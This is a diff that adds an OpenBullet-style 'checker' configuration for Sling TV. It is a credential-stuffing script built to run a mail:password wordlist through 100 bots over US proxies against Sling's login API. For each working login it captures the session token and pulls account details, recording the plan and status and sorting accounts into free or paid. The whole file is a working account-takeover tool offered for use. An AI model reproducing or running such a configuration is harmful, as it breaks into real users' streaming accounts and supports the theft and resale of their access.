@@ -1,0 +1,58 @@
+[SETTINGS]
+{
+  "Name": "Sling",
+  "SuggestedBots": 100,
+  "LastModified": "2018-06-04T21:36:40.9545862+00:00",
+  "AdditionalInfo": "US proxies only",
+  "Author": "SubAtomic",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#Login_(POST) REQUEST POST "https://webapi-blu.p.sling.com/ums/v5/sessions?client_application=ottweb&format=json&locale=en" AutoRedirect=TRUE 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json;charset=UTF-8" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "referer: https://www.sling.com/signin" 
+  HEADER "origin: https://www.sling.com" 
+#CHECK_FOR_SUCCESS/FAIL KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Invalid email/password combination" 
+    KEY "is only available inside the US" 
+  KEYCHAIN Success OR 
+    KEY "token" 
+#PARSE_TOKEN PARSE "<SOURCE>" JSON "token" Recursive=FALSE -> VAR "TOKEN" "" "" 
+#REQUEST_ACC_DETAILS REQUEST GET "https://webapi-blu.p.sling.com/ums/v5/user/account_details?client_application=ottweb&format=json&locale=en&token=" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Authorization: Bearer <TOKEN>" 
+  HEADER "referer: https://www.sling.com/signin" 
+  HEADER "x-jwt-authorization: Bearer <TOKEN>" 
+#PASRE_PLAN PARSE "<SOURCE>" JSON "freemium_identifiers" Recursive=FALSE -> CAP "PLAN" "" "" 
+#PARSE_ACTIVE PARSE "<SOURCE>" JSON "account_status" Recursive=FALSE -> CAP "STATUS" "" "" 
+#SEPERATE_ACCS KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "expired" 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "cancelled" 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "lead" 
